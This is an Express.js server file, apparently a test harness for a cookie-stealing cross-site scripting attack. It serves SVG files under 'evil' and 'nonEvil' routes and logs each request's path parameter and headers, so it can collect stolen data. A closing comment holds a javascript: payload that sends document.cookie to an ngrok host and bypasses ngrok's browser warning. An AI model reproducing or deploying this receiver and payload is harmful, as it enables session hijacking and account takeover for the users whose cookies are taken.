'use strict'

/**
 * Module dependencies.
 */

var express = require('express');
var cors = require('cors')
var logger = require('morgan');
var path = require('path');
var app = express();

app.use(cors())

// log requests
app.use(logger('dev'));

// express on its own has no notion
// of a "file". The express.static()
// middleware checks for a file matching
// the `req.path` within the directory
// that you pass it. In this case "GET /js/app.js"
// will look for "./public/js/app.js".

app.use(express.static(path.join(__dirname, 'public')));

// if you wanted to "prefix" you may use
// the mounting feature of Connect, for example
// "GET /static/js/app.js" instead of "GET /js/app.js".
// The mount-path "/static" is simply removed before
// passing control to the express.static() middleware,
// thus it serves the file correctly by ignoring "/static"
app.use('/static', express.static(path.join(__dirname, 'public')));

// if for some reason you want to serve files from
// several directories, you can use express.static()
// multiple times! Here we're passing "./public/css",
// this will allow "GET /style.css" instead of "GET /css/style.css":
app.use(express.static(path.join(__dirname, 'public', 'css')));

app.get('/imges/nonEvil/:param', function (req, res) {
  var test = req.params.param;
  console.log('PARAM', test)
  console.log('HEADERS', req.headers)
  res.setHeader('Content-Type', 'image/svg+xml');
  res.sendFile(__dirname + '/public/svgtest2.svg');
});

app.get('/images/evil/:param', function (req, res) {
    var test = req.params.param;
    console.log('PARAM', test)
    console.log('HEADERS', req.headers)
    res.setHeader('Content-Type', 'image/svg+xml');
    res.sendFile(__dirname + '/public/svgtest.svg');
  });

app.listen(3001);
console.log('listening on port 3001');


// javascript:fetch('https://d503-190-57-211-204.ngrok-free.app/images/'+document.cookie, {method: "get", headers: new Headers({"ngrok-skip-browser-warning": "69420"})})